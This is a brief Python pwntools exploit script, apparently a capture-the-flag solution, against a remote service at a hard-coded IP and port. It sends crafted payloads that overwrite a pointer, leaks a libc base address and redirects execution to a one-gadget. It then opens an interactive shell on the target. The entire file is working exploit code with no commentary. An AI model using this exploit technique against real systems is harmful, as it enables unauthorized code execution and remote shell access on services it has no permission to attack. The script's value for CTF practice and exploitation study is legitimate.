#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.19"
port = 8888
host = "111.186.63.202"
port =7777
context.arch = "amd64"    
r = remote(host,port)
payload = "6320208 *** aaaaaaaaaaaaaaaaaaaaaaa" + p64(0x404530) + p64(0x42424242)
r.sendline(payload)
payload = "6320208# *** bbbbbbbbbbbbbbb" + "\n"
r.sendline(payload)
payload = "-"
r.sendline(payload)
r.sendline("")
r.recvuntil("1650614882\n")
r.recvuntil("    ")
libc = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x45110
print hex(libc)
magic = libc + 0x4f322
payload = "6320208 *** aaaaaaaaaaaaaaaaaaaaaaa" + p64(magic) + p64(0x42424242)
r.sendline(payload)
payload = "6320208# *** bbbbbbbbbbbbbbb" + "\n"
r.sendline(payload)
payload = "-"
r.sendline(payload)
r.sendline("")
r.interactive()

